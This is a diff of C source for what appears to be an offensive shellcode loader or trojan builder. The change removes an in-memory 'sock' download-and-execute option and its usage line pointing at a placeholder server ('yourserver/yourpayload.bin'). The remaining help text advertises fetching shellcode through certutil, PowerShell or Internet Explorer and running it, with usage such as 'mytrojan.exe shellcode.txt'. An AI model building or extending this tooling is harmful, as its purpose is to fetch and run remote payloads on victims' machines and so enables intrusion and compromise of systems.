@@ -109,9 +109,7 @@ int main (int argc, char **argv)
 
 	if(dvalue)
 	{
-		if (strcmp(dvalue, "sock")==0)
-			fprintf (file_def, "#define DOWNLOADEXECSC\n");
-		else if (strcmp(dvalue, "certutil")==0)
+		if (strcmp(dvalue, "certutil")==0)
 			fprintf (file_def, "#define DOWNLOADCERTUTIL\n");
 		else if (strcmp(dvalue, "powershell")==0)
 			fprintf (file_def, "#define DOWNLOADPOWERSHELL\n");
@@ -126,9 +124,7 @@ void print_help()
 	printf("Options:\n");	
 	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
-	printf("-d download the shellcode file using different techniques\n");
-	printf("   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)\n");
-	printf("      usage example: pwn.exe http://yourserver/yourpayload.bin\n");
+	printf("-d download the shellcode file using different techniques\n");	
 	printf("   -d certutil -> use certutil.exe for downloading the file\n");
 	printf("   -d powershell -> use powershell for downloading the file\n");
 	printf("      usage of -d certutil/powershell in combination with -f\n");
